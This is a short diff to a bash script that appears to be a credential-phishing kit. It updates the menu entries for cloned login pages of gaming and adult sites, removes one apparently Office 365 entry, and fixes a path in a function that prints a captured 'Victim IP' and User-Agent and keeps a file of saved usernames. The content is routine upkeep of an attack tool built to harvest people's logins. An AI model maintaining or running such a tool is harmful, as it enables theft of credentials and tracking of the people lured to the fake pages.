@@ -345,7 +345,6 @@ server="freefire"
 start1
 
 elif [[ $menu_option == 44 ]]; then
-server="oofc365"
 start1
 
 elif [[ $menu_option == 45 ]]; then
@@ -362,15 +361,15 @@ server="Pubg"
 start1
 
 elif [[ $menu_option == 48 ]]; then
-server="Pornhub"
+server="pornhub"
 start1
 
 elif [[ $menu_option == 49 ]]; then
-server="Xvideos"
+server="xvideos"
 start1
 
 elif [[ $menu_option == 50 ]]; then
-server="Codm"
+server="codm"
 start1
 
 elif [[ $menu_option == 51 ]]; then
@@ -760,7 +759,7 @@ done
 
 catch_ip() {
 touch .sites/$server/saved.usernames.txt
-ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+ip=$(grep -a 'IP:' .sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' .sites/$server/ip.txt | cut -d '"' -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
